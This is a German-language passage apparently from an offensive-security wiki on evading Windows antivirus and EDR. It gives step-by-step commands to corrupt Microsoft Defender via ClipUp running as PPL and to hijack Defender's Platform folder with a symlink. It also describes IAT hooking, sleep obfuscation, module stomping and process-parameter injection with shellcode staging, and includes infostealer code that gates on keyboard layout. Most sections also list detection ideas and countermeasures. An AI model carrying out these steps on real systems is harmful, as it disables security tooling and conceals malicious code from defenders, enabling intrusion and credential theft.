CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- Die signierte System-Binary `C:\Windows\System32\ClipUp.exe` startet sich selbst und akzeptiert einen Parameter, um eine Logdatei in einen vom Aufrufer angegebenen Pfad zu schreiben.
- Wenn sie als PPL-Prozess gestartet wird, erfolgt der Dateischreibvorgang mit PPL-Unterstützung.
- ClipUp kann keine Pfade mit Leerzeichen verarbeiten; verwende 8.3-Kurzpfade, um auf normalerweise geschützte Speicherorte zu verweisen.

8.3-Kurzpfad-Hilfsbefehle
- Kurznamen auflisten: `dir /x` in jedem übergeordneten Verzeichnis.
- Kurzpfad in cmd ermitteln: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Missbrauchskette (abstrakt)
1) Starte das PPL-fähige LOLBIN (ClipUp) mit `CREATE_PROTECTED_PROCESS` unter Verwendung eines Launchers (z. B. CreateProcessAsPPL).
2) Übergib das ClipUp-Argument für den Logpfad, um die Erstellung einer Datei in einem geschützten AV-Verzeichnis (z. B. Defender Platform) zu erzwingen. Verwende bei Bedarf 8.3-Kurznamen.
3) Wenn die Zieldatei während des Betriebs normalerweise vom AV geöffnet/gesperrt wird (z. B. MsMpEng.exe), plane den Schreibvorgang beim Booten, bevor der AV startet, indem du einen Auto-Start-Service installierst, der zuverlässig früher ausgeführt wird. Überprüfe die Boot-Reihenfolge mit Process Monitor (Boot-Protokollierung).
4) Beim Neustart erfolgt der von PPL unterstützte Schreibvorgang, bevor der AV seine Binaries sperrt, wodurch die Zieldatei beschädigt und der Start verhindert wird.

Beispielaufruf (Pfade aus Sicherheitsgründen entfernt/gekürzt):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Hinweise und Einschränkungen
- Du kannst den Inhalt, den ClipUp schreibt, nicht kontrollieren, sondern nur dessen Platzierung; die Primitive eignet sich eher für Korruption als für das präzise Injizieren von Inhalten.
- Erfordert lokale Administratorrechte/SYSTEM, um einen Dienst zu installieren/zu starten, sowie ein Reboot-Zeitfenster.
- Das Timing ist kritisch: Das Ziel darf nicht geöffnet sein; die Ausführung zum Bootzeitpunkt vermeidet Dateisperren.

Erkennungen
- Erstellung von Prozessen mit `ClipUp.exe` und ungewöhnlichen Argumenten, insbesondere wenn der übergeordnete Prozess ein nicht standardmäßiger Launcher ist und dies während des Bootvorgangs geschieht.
- Neue Dienste, die so konfiguriert sind, dass sie verdächtige Binärdateien automatisch starten, und die nachweislich vor Defender/AV gestartet werden. Die Erstellung/Änderung von Diensten vor Fehlern beim Start von Defender untersuchen.
- Überwachung der Dateiintegrität von Defender-Binärdateien und Platform-Verzeichnissen; unerwartete Dateiänderungen oder neu erstellte Dateien durch Prozesse mit Protected-Process-Flags.
- ETW/EDR-Telemetrie: Nach Prozessen suchen, die mit `CREATE_PROTECTED_PROCESS` erstellt wurden, sowie nach einer anomal hohen PPL-Level-Nutzung durch Nicht-AV-Binärdateien.

Gegenmaßnahmen
- WDAC/Code Integrity: Einschränken, welche signierten Binärdateien als PPL und unter welchen übergeordneten Prozessen ausgeführt werden dürfen; Aufrufe von ClipUp außerhalb legitimer Kontexte blockieren.
- Diensthygiene: Die Erstellung/Änderung automatisch startender Dienste einschränken und Manipulationen der Startreihenfolge überwachen.
- Sicherstellen, dass der Tamper-Schutz von Defender und die Early-Launch-Schutzmechanismen aktiviert sind; Startfehler untersuchen, die auf eine Beschädigung von Binärdateien hindeuten.
- Das Deaktivieren der Generierung von 8.3-Kurznamen auf Volumes erwägen, auf denen Security-Tools gespeichert sind, sofern dies mit deiner Umgebung kompatibel ist (gründlich testen).

## Tampering von Microsoft Defender über einen Symlink-Hijack des Platform-Versionsordners

Windows Defender wählt die Platform, von der es ausgeführt wird, indem es Unterordner unter folgendem Pfad enumeriert:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Es wählt den Unterordner mit dem lexikografisch höchsten Versionsstring (z. B. `4.18.25070.5-0`) und startet anschließend die Defender-Dienstprozesse von dort (wobei die Pfade des Dienstes/der Registry entsprechend aktualisiert werden). Diese Auswahl vertraut auf Verzeichniseinträge einschließlich Directory-Reparse-Points (Symlinks). Ein Administrator kann dies ausnutzen, um Defender auf einen vom Angreifer beschreibbaren Pfad umzuleiten und DLL-Sideloading oder eine Störung des Dienstes zu erreichen.<sup>[[21]](#references)[[22]](#references)</sup>

Voraussetzungen
- Lokaler Administrator (erforderlich, um Verzeichnisse/Symlinks unter dem Platform-Ordner zu erstellen)
- Möglichkeit, einen Reboot durchzuführen oder eine erneute Auswahl der Defender-Platform auszulösen (Dienstneustart beim Booten)
- Es sind nur integrierte Tools erforderlich (`mklink`)

Warum es funktioniert
- Defender blockiert Schreibvorgänge in seinen eigenen Ordnern, aber die Auswahl der Platform vertraut auf Verzeichniseinträge und wählt die lexikografisch höchste Version, ohne zu validieren, dass das Ziel in einen geschützten/vertrauenswürdigen Pfad aufgelöst wird.

Schritt für Schritt (Beispiel)
1) Einen beschreibbaren Klon des aktuellen Platform-Ordners vorbereiten, z. B. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Erstelle innerhalb von Platform einen Verzeichnis-Symlink für eine höhere Version, der auf deinen Ordner zeigt:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Trigger-Auswahl (Neustart empfohlen):
```cmd
shutdown /r /t 0
```
4) Überprüfen, dass MsMpEng.exe (WinDefend) aus dem umgeleiteten Pfad ausgeführt wird:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Du solltest den neuen Prozesspfad unter `C:\TMP\AV\` beobachten und feststellen, dass die Dienstkonfiguration/Registry diesen Pfad widerspiegelt.

Post-Exploitation-Optionen
- DLL sideloading/code execution: DLLs ablegen/ersetzen, die Defender aus seinem Anwendungsverzeichnis lädt, um Code in den Defender-Prozessen auszuführen. Siehe den obigen Abschnitt: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Den Versions-Symlink entfernen, sodass der konfigurierte Pfad beim nächsten Start nicht aufgelöst werden kann und Defender den Start abbricht:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Beachten Sie, dass diese Technik allein keine Privilege Escalation ermöglicht; sie erfordert Admin-Rechte.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red Teams können Runtime-Evasion aus dem C2-Implantat in das Zielmodul selbst verlagern, indem sie dessen Import Address Table (IAT) hooken und ausgewählte APIs über attacker-controlled, position-independent code (PIC) routen. Dies verallgemeinert die Evasion über die kleine API-Oberfläche hinaus, die viele Kits bereitstellen (z. B. CreateProcessA), und erweitert denselben Schutz auf BOFs und post-exploitation DLLs.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Ansatz auf hoher Ebene
- Ein PIC blob wird mithilfe eines reflective loaders neben dem Zielmodul platziert (vorangestellt oder als Companion). Der PIC muss self-contained und position-independent sein.
- Beim Laden der Host-DLL wird ihr IMAGE_IMPORT_DESCRIPTOR durchlaufen und die IAT-Einträge für die targeted imports (z. B. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) so gepatcht, dass sie auf dünne PIC wrappers zeigen.
- Jeder PIC wrapper führt vor dem Aufruf Evasions aus und ruft anschließend per tail-call die Adresse der real API auf. Typische Evasions umfassen:
- Memory mask/unmask rund um den Aufruf (z. B. Beacon-Regionen verschlüsseln, RWX→RX, Seitennamen/-berechtigungen ändern) und anschließend nach dem Aufruf wiederherstellen.
- Call-Stack Spoofing: Einen benignen Stack erstellen und in die target API wechseln, sodass die Call-Stack-Analyse die erwarteten Frames auflöst.<sup>[[9]](#references)</sup>
- Für die Kompatibilität wird eine Schnittstelle exportiert, über die ein Aggressor-Script (oder ein Äquivalent) registrieren kann, welche APIs für Beacon, BOFs und post-exploitation DLLs gehookt werden sollen.

Warum hier IAT hooking
- Funktioniert für jeden Code, der den gehookten Import verwendet, ohne den Tool-Code zu ändern oder sich darauf zu verlassen, dass Beacon bestimmte APIs proxied.
- Deckt post-exploitation DLLs ab: Durch das Hooken von LoadLibrary* können Modul-Ladevorgänge abgefangen werden (z. B. System.Management.Automation.dll, clr.dll), um dieselbe Masking-/Stack-Evasion auf deren API-Aufrufe anzuwenden.
- Stellt die zuverlässige Nutzung von post-exploitation-Befehlen zur Prozess-Erzeugung gegenüber Call-Stack-basierten Erkennungen wieder her, indem CreateProcessA/W gewrappt wird.

Minimaler IAT-hook-Sketch (x64 C/C++-Pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Hinweise
- Wende den Patch nach Relocations/ASLR und vor der ersten Verwendung des Imports an. Reflective loaders wie TitanLdr/AceLdr demonstrieren das Hooking während `DllMain` des geladenen Moduls.
- Halte Wrappers klein und PIC-safe; löse die echte API über den ursprünglichen IAT-Wert auf, den du vor dem Patching erfasst hast, oder über `LdrGetProcedureAddress`.
- Verwende RW → RX-Übergänge für PIC und vermeide dauerhaft writable+executable Pages.

Call-stack spoofing stub
- Draugr-style PIC stubs erstellen eine gefälschte Call Chain (Return Addresses in gutartigen Modulen) und wechseln anschließend in die echte API.
- Dadurch werden Erkennungen umgangen, die kanonische Stacks von Beacon/BOFs zu sensiblen APIs erwarten.
- Kombiniere dies mit Stack-cutting-/Stack-stitching-Techniken, um vor dem API-Prologue innerhalb der erwarteten Frames zu landen.

Operative Integration
- Stelle den Reflective Loader den Post-Ex-DLLs voran, damit PIC und Hooks automatisch initialisiert werden, wenn die DLL geladen wird.
- Verwende ein Aggressor-Script, um Ziel-APIs zu registrieren, sodass Beacon und BOFs ohne Codeänderungen transparent vom gleichen Evasion-Pfad profitieren.

Detection/DFIR-Aspekte
- IAT-Integrität: Einträge, die auf nicht zum Image gehörende (Heap-/anonyme) Adressen zeigen; regelmäßige Überprüfung von Import-Pointern.
- Stack-Anomalien: Return Addresses, die zu keinem geladenen Image gehören; abrupte Übergänge zu nicht zum Image gehörendem PIC; inkonsistente `RtlUserThreadStart`-Abstammung.
- Loader-Telemetrie: In-Process-Schreibvorgänge in die IAT, frühe `DllMain`-Aktivität, die Import-Thunks verändert, unerwartete RX-Regionen, die beim Laden erstellt werden.
- Image-load-Evasion: Wenn `LoadLibrary*` gehookt wird, überwache verdächtige Loads von Automation-/clr-Assemblies, die mit Memory-Masking-Ereignissen korrelieren.

Verwandte Bausteine und Beispiele
- Reflective loaders, die während des Ladens IAT-Patching durchführen (z. B. TitanLdr, AceLdr)
- Memory-masking-Hooks (z. B. simplehook) und Stack-cutting-PIC (stackcutting)
- PIC Call-stack-spoofing stubs (z. B. Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT hooks über ein residentes PICO

Wenn du einen Reflective Loader kontrollierst, kannst du Imports **während** `ProcessImports()` hooken, indem du den `GetProcAddress`-Pointer des Loaders durch einen benutzerdefinierten Resolver ersetzt, der zuerst nach Hooks sucht:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Erstelle ein **resident PICO** (persistentes PIC-Objekt), das bestehen bleibt, nachdem sich der transiente Loader-PIC selbst freigegeben hat.
- Exportiere eine `setup_hooks()`-Funktion, die den Import-Resolver des Loaders überschreibt (z. B. `funcs.GetProcAddress = _GetProcAddress`).
- Überspringe in `_GetProcAddress` Ordinal-Imports und verwende eine hash-basierte Hook-Suche wie `__resolve_hook(ror13hash(name))`. Wenn ein Hook vorhanden ist, gib ihn zurück; andernfalls delegiere an den echten `GetProcAddress`.
- Registriere Hook-Ziele zur Link-Zeit mit Crystal-Palace-`addhook "MODULE$Func" "hook"`-Einträgen. Der Hook bleibt gültig, weil er innerhalb des residenten PICO liegt.

Damit wird eine **Import-time-IAT-Umleitung** erreicht, ohne nach dem Laden den Code-Abschnitt der geladenen DLL zu patchen.

### Erzwingen hookbarer Imports, wenn das Ziel PEB-walking verwendet

Import-time Hooks werden nur ausgelöst, wenn sich die Funktion tatsächlich in der IAT des Ziels befindet. Wenn ein Modul APIs über einen PEB-walk + Hash auflöst (ohne Import-Eintrag), erzwinge einen echten Import, damit der `ProcessImports()`-Pfad des Loaders ihn sieht:

- Ersetze die Auflösung gehashter Exports (z. B. `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) durch eine direkte Referenz wie `&WaitForSingleObject`.
- Der Compiler erzeugt einen IAT-Eintrag, wodurch die Interception ermöglicht wird, wenn der Reflective Loader Imports auflöst.

### Ekko-style Sleep/Idle Obfuscation ohne Patching von `Sleep()`

Statt `Sleep` zu patchen, hooke die **tatsächlichen Wait-/IPC-Primitiven**, die das Implant verwendet (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Für lange Wartezeiten kapselst du den Aufruf in eine Ekko-style Obfuscation Chain, die das In-Memory-Image während der Idle-Phase verschlüsselt:<sup>[[31]](#references)[[27]](#references)</sup>

- Verwende `CreateTimerQueueTimer`, um eine Sequenz von Callbacks zu planen, die `NtContinue` mit präparierten `CONTEXT`-Frames aufrufen.
- Typische Chain (x64): Image auf `PAGE_READWRITE` setzen → RC4-Verschlüsselung über das vollständige gemappte Image mit `advapi32!SystemFunction032` → blockierenden Wait ausführen → RC4-Entschlüsselung → **Berechtigungen pro Section wiederherstellen**, indem die PE-Sections durchlaufen werden → Abschluss signalisieren.
- `RtlCaptureContext` liefert ein Template-`CONTEXT`; klone es in mehrere Frames und setze Register (`Rip/Rcx/Rdx/R8/R9`), um jeden Schritt aufzurufen.

Operatives Detail: Gib für lange Waits (z. B. `WAIT_OBJECT_0`) „success“ zurück, damit der Caller fortfährt, während das Image maskiert ist. Dieses Muster verbirgt das Modul während Idle-Fenstern vor Scannern und vermeidet die klassische Signatur eines „gepatchten `Sleep()`“.

Detection-Ideen (telemetriebasiert)
- Bursts von `CreateTimerQueueTimer`-Callbacks, die auf `NtContinue` zeigen.
- Verwendung von `advapi32!SystemFunction032` auf großen, zusammenhängenden, imagegroßen Buffern.
- `VirtualProtect` über große Bereiche, gefolgt von einer benutzerdefinierten Wiederherstellung der Berechtigungen pro Section.

### Runtime-CFG-Registrierung für Sleep-Obfuscation-Gadgets

Bei CFG-aktivierten Zielen führt der erste indirekte Sprung in ein Mid-function-Gadget wie `jmp [rbx]` oder `jmp rdi` normalerweise zum Absturz des Prozesses mit `STATUS_STACK_BUFFER_OVERRUN`, weil das Gadget nicht in den CFG-Metadaten des Moduls vorhanden ist. Damit Ekko-/Kraken-style Chains innerhalb gehärteter Prozesse funktionsfähig bleiben:<sup>[[30]](#references)</sup>

- Registriere jedes von der Chain verwendete indirekte Ziel mit `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` und `CFG_CALL_TARGET_VALID`-Einträgen.
- Bei Adressen innerhalb geladener Images (`ntdll`, `kernel32`, `advapi32`) muss der `MEMORY_RANGE_ENTRY` am **Image Base** beginnen und die **vollständige Image-Größe** abdecken.
- Verwende für manuell gemappte/PIC-/gestompte Regionen stattdessen die **Allocation Base** und die Allocation Size.
- Markiere nicht nur das Dispatch-Gadget, sondern auch indirekt erreichte Exports (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, Wait-/Event-Syscalls) sowie alle vom Angreifer kontrollierten ausführbaren Sections, die zu indirekten Zielen werden.

Dadurch werden ROP-/JOP-style Sleep Chains von „funktioniert nur in Nicht-CFG-Prozessen“ zu einem wiederverwendbaren Primitive für `explorer.exe`, Browser, `svchost.exe` und andere mit `/guard:cf` kompilierte Endpoints.

### CET-sicheres Stack-Spoofing für schlafende Threads

Der vollständige Austausch von `CONTEXT` ist auffällig und kann auf CET-Shadow-Stack-Systemen fehlschlagen, weil ein gespooftes `Rip` weiterhin mit dem Hardware-Shadow-Stack übereinstimmen muss. Ein sichereres Sleep-Masking-Muster ist:<sup>[[30]](#references)</sup>

- Wähle einen anderen Thread desselben Prozesses und lese dessen `NT_TIB`-/TEB-Stack-Grenzen (`StackBase`, `StackLimit`) über `NtQueryInformationThread`.
- Sichere den echten TEB/TIB des aktuellen Threads.
- Erfasse den echten Sleeping-Context mit `GetThreadContext`.
- Kopiere **nur das echte `Rip`** in den Spoof-Context und lasse den gespooften `Rsp`-/Stack-Zustand unverändert.
- Kopiere während des Sleep-Fensters den `NT_TIB` des Spoof-Threads in den aktuellen TEB, damit Stack-Walker innerhalb eines legitimen Stack-Bereichs unwindet.
- Stelle nach Abschluss des Waits den ursprünglichen TIB und Thread-Context wieder her.

Dies bewahrt einen CET-konsistenten Instruction Pointer und täuscht gleichzeitig EDR-Stack-Walker, die TEB-Stack-Metadaten zur Validierung von Unwinds verwenden.

### APC-basierte Alternative: Kraken Mask

Wenn Timer-Queue-Dispatch zu stark signiert ist, kann dieselbe Sleep-encrypt-spoof-restore-Sequenz aus einem suspendierten Helper-Thread mit gequeuten APCs ausgeführt werden:<sup>[[27]](#references)</sup>

- Erstelle einen Helper-Thread mit `NtTestAlert` als Entrypoint.
- Queue präparierte `CONTEXT`-Frames/APCs mit `NtQueueApcThread` und leere sie mit `NtAlertResumeThread`.
- Speichere den Chain-State auf dem Heap statt auf dem Helper-Stack, um eine Erschöpfung des standardmäßigen 64-KB-Thread-Stacks zu vermeiden.
- Verwende `NtSignalAndWaitForSingleObject`, um das Start-Event atomar zu signalisieren und zu blockieren.
- Suspendiere den Main-Thread vor der Wiederherstellung von TIB/Context (`NtSuspendThread` → restore → `NtResumeThread`), um das Race Window zu verkleinern, in dem ein Scanner einen teilweise wiederhergestellten Stack erfassen könnte.

Dadurch wird die `CreateTimerQueueTimer` + `NtContinue`-Signatur gegen eine Helper-Thread-/APC-Signatur ausgetauscht, während dieselben RC4-Masking- und Stack-Spoofing-Ziele erhalten bleiben.

Zusätzliche Detection-Ideen
- `NtSetInformationVirtualMemory` mit `VmCfgCallTargetInformation` kurz vor Sleeps, Waits oder APC-Dispatch.
- `GetThreadContext`/`SetThreadContext` in Verbindung mit `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` oder `ConnectNamedPipe`.
- `NtQueryInformationThread`, gefolgt von direkten Schreibvorgängen in die Stack-Grenzen des TEB/TIB des aktuellen Threads.
- `NtQueueApcThread`/`NtAlertResumeThread`-Chains, die indirekt `SystemFunction032`, `VirtualProtect` oder Hilfsfunktionen zur Wiederherstellung von Section-Berechtigungen erreichen.
- Wiederholte Verwendung kurzer Gadget-Signaturen wie `FF 23` (`jmp [rbx]`) oder `FF E7` (`jmp rdi`) als Dispatch-Pivots innerhalb signierter Module.


## Precision Module Stomping

Module Stomping führt Payloads aus dem **`.text`-Abschnitt einer DLL aus, die bereits innerhalb des Zielprozesses gemappt ist**, statt offensichtlichen privaten ausführbaren Speicher zu allokieren oder eine neue sacrificial DLL zu laden. Das Überschreibziel sollte ein **geladenes, datenträgergebundenes Image** sein, dessen Code-Bereich die Payload aufnehmen kann, ohne Codepfade zu beschädigen, die der Prozess weiterhin benötigt.<sup>[[1]](#references)[[2]](#references)</sup>

### Zuverlässige Zielauswahl

Naives Stomping gegen verbreitete Module wie `uxtheme.dll` oder `comctl32.dll` ist fragil: Die DLL ist möglicherweise nicht im Remote-Prozess geladen, und ein zu kleiner Code-Bereich wird den Prozess zum Absturz bringen. Ein zuverlässigerer Workflow ist:

1. Enumeriere die Module des Zielprozesses und behalte eine **Include-Liste nur mit Namen** bereits geladener DLLs.
2. Erstelle zuerst die Payload und erfasse ihre **exakte Byte-Größe**.
3. Scanne die Kandidaten-DLLs auf dem Datenträger und vergleiche die PE-Section **`.text` `Misc_VirtualSize`** mit der Payload-Größe. Dies ist wichtiger als die Dateigröße, weil es die Größe des ausführbaren Abschnitts **im gemappten Speicher** widerspiegelt.
4. Parse die **Export Address Table (EAT)** und wähle eine exportierte Function-RVA als Startoffset für das Stomping.
5. Berechne den **Blast Radius**: Wenn die Payload die Grenze der ausgewählten Funktion überschreitet, überschreibt sie angrenzende Exports, die danach im Speicher angeordnet sind.

Typische Recon-/Auswahl-Hilfsfunktionen, die in freier Wildbahn zu sehen sind:
```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```
Operational notes
- Bevorzuge DLLs, die im Remote-Prozess **bereits geladen** sind, um die Telemetrie von `LoadLibrary`/unerwarteten Image-Loads zu vermeiden.
- Bevorzuge Exports, die von der Zielanwendung selten ausgeführt werden; andernfalls können normale Codepfade die manipulierten Bytes vor oder nach der Thread-Erstellung ausführen.
- Große Implants erfordern häufig, die Einbettung des Shellcodes von einem String-Literal in einen **Byte-Array/braced initializer** zu ändern, damit der vollständige Buffer im Injector-Quellcode korrekt dargestellt wird.

Detection ideas
- Remote-Schreibvorgänge in **image-backed executable pages** (`MEM_IMAGE`, `PAGE_EXECUTE*`) statt in den häufigeren privaten RWX/RX-Allokationen.
- Export-Einstiegspunkte, deren Bytes im Speicher nicht mehr mit der zugrunde liegenden Datei auf der Festplatte übereinstimmen.
- Remote-Threads oder Context-Pivots, die mit der Ausführung innerhalb eines legitimen DLL-Exports beginnen, dessen erste Bytes kürzlich geändert wurden.
- Verdächtige `VirtualProtect(Ex)`-/`WriteProcessMemory`-Sequenzen gegen DLL-`.text`-Pages, gefolgt von einer Thread-Erstellung.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) ist eine **process-injection / EDR-evasion**-Technik, die den klassischen Remote-Schreibpfad (`VirtualAllocEx` + `WriteProcessMemory`) vermeidet. Statt Bytes in ein bereits laufendes Ziel zu kopieren, missbraucht sie die Tatsache, dass Windows ausgewählte `CreateProcessW`-Startparameter in den Child-Prozess **kopiert** und innerhalb von `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`) speichert.<sup>[[28]](#references)[[29]](#references)</sup>

### Poisonable carriers copied by `CreateProcessW`

Nützliche Carrier sind:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (mit `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Praktische Einschränkungen der Carrier:

- `lpCommandLine` muss für `CreateProcessW` auf beschreibbaren Speicher zeigen und ist auf **32.767 Unicode-Zeichen** einschließlich des Nullterminators begrenzt.
- `lpEnvironment` muss ein Unicode-Environment-Block aus aufeinanderfolgenden `NAME=VALUE\0`-Strings sein, der mit einem zusätzlichen `\0` endet.
- `lpReserved` ist offiziell reserviert, daher sollte das `ShellInfo`-Mapping eher als Implementierungsdetail und nicht als stabiler dokumentierter Vertrag betrachtet werden.

Dadurch wird die normale Prozesserstellung zum **payload-transfer primitive**. Der Operator erstellt den Child-Prozess mit vom Angreifer kontrollierten Startdaten und überlässt Windows das Kopieren zwischen den Prozessen.

### Remote lookup flow without remote write APIs

Nachdem der Child-Prozess erstellt wurde, wird der kopierte Buffer mit **read-only**-Primitives aufgelöst:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → `PROCESS_BASIC_INFORMATION.PebBaseAddress` abrufen
2. Den Remote-`PEB` lesen
3. `PEB.ProcessParameters` folgen
4. `RTL_USER_PROCESS_PARAMETERS` lesen
5. Den ausgewählten Pointer verwenden:
- `parameters.CommandLine.Buffer`
- `parameters.Environment`
- `parameters.ShellInfo.Buffer`

Minimaler Ablauf:
```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```
### Ausführen des kopierten Parameterpuffers

Die kopierte Parameterregion ist normalerweise `RW` und nicht ausführbar. Eine übliche P3 chain besteht aus:

1. Den Prozess normal erstellen (nicht im suspendierten Zustand)
2. Die ausgewählte Parameterseite mit `NtProtectVirtualMemory` / `VirtualProtectEx` ausführbar machen
3. Das bereits in `PROCESS_INFORMATION` zurückgegebene Handle des Main Threads wiederverwenden
4. Die Ausführung mit `NtSetContextThread` (`CONTEXT_CONTROL`, `RIP` überschreiben) umleiten

Anders als bei klassischen Thread-Hijacking-Workflows sind `SuspendThread` / `ResumeThread` hierfür **nicht erforderlich**; der Context kann direkt über das zurückgegebene Handle des Main Threads geändert werden.

Dadurch werden mehrere APIs vermieden, die häufig auf Injection überwacht werden:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- häufig auch `SuspendThread` / `ResumeThread`

### Einschränkung durch Null-Bytes und staged shellcode

Alle drei Träger enthalten **String- oder stringähnliche Daten**, daher wird ein Raw-Payload, das `0x00` enthält, während der Übertragung abgeschnitten. Ein praktikabler Workaround ist eine **null-free first stage**, die Konstanten zur Laufzeit rekonstruiert und anschließend eine beliebige second stage lädt.

Ein einfaches Muster ist die XOR-basierte Synthese von Konstanten:
```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```
Dies ermöglicht es der ersten Stufe, Stack-Strings, API-Argumente, DLL-Pfade oder einen Shellcode-Loader der zweiten Stufe zu erstellen, ohne Nullbytes in den übertragenen Parameter einzubetten.

### Stack-based API calls from the first stage

Wenn die erste Stufe APIs wie `LoadLibraryA` aufrufen muss, kann sie:

- den String/Buffer auf den Stack des Ziels pushen
- den **32-byte x64 shadow space** reservieren
- `RCX`, `RDX`, `R8`, `R9` auf Konstanten oder `RSP`-relative Pointer setzen
- `RSP` vor dem Aufruf **16-byte aligned** halten

Eine zweite Stufe kann anschließend vom Stack in eine `PAGE_READWRITE`-Allocation kopiert, mit `VirtualProtect` auf `PAGE_EXECUTE_READ` umgestellt und angesprungen werden, wodurch eine direkte RWX-Allocation vermieden wird.

### Detection ideas

Gute Hunting-Möglichkeiten, die von den Autoren erwähnt wurden:

- `VirtualProtectEx` / `NtProtectVirtualMemory`, die **process-parameter pages executable** machen
- diese Protection-Änderung gefolgt von `SetThreadContext` / `NtSetContextThread`
- Remote-Reads von `PEB` und anschließend von `RTL_USER_PROCESS_PARAMETERS`
- ungewöhnlich lange / entropy-reiche Werte in `lpCommandLine`, `lpEnvironment` oder `STARTUPINFO.lpReserved` während der Prozesserstellung

### Notes

- P3 ist ein **cross-process transfer trick** und allein keine vollständige Execution Primitive: Der kopierte Parameter benötigt weiterhin eine Änderung der Execute-Permissions und eine Methode zur Execution Redirection.
- `RtlCreateProcessReflection` / Dirty Vanity wurde von den Autoren in Betracht gezogen, aber verworfen, weil es intern verdächtige Primitives wie `NtWriteVirtualMemory` und `NtCreateThreadEx` verwendet.

## SantaStealer Tradecraft for Fileless Evasion and Credential Theft

SantaStealer (auch bekannt als BluelineStealer) veranschaulicht, wie moderne Info-Stealer AV bypass, Anti-Analysis und Credential Access in einem einzigen Workflow kombinieren.<sup>[[24]](#references)</sup>

### Keyboard layout gating & sandbox delay

- Ein Config-Flag (`anti_cis`) listet installierte Keyboard Layouts über `GetKeyboardLayoutList` auf. Wenn ein Cyrillic-Layout gefunden wird, legt das Sample einen leeren `CIS`-Marker an und beendet sich vor der Ausführung der Stealer. Dadurch wird sichergestellt, dass es in ausgeschlossenen Locales niemals detoniert, während ein Hunting-Artefakt zurückbleibt.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Layered-`check_antivm`-Logik

- Variante A durchläuft die Prozessliste, hasht jeden Namen mit einer benutzerdefinierten rollierenden Prüfsumme und vergleicht sie mit eingebetteten Blocklists für Debugger/Sandboxes; anschließend wiederholt sie die Prüfsumme über den Computernamen und überprüft Arbeitsverzeichnisse wie `C:\analysis`.
- Variante B untersucht Systemeigenschaften (Mindestanzahl an Prozessen, kürzliche Betriebszeit), ruft `OpenServiceA("VBoxGuest")` auf, um VirtualBox Additions zu erkennen, und führt Timing-Prüfungen rund um Sleeps durch, um Single-Stepping zu erkennen. Jeder Treffer bricht den Vorgang ab, bevor Module gestartet werden.

### Fileless-Helper + doppeltes ChaCha20-Reflective-Loading

- Die primäre DLL/EXE bettet einen Chromium-Credential-Helper ein, der entweder auf die Festplatte geschrieben oder manuell in den Speicher gemappt wird; im Fileless-Modus löst er Imports/Relocations selbst auf, sodass keine Helper-Artefakte geschrieben werden.
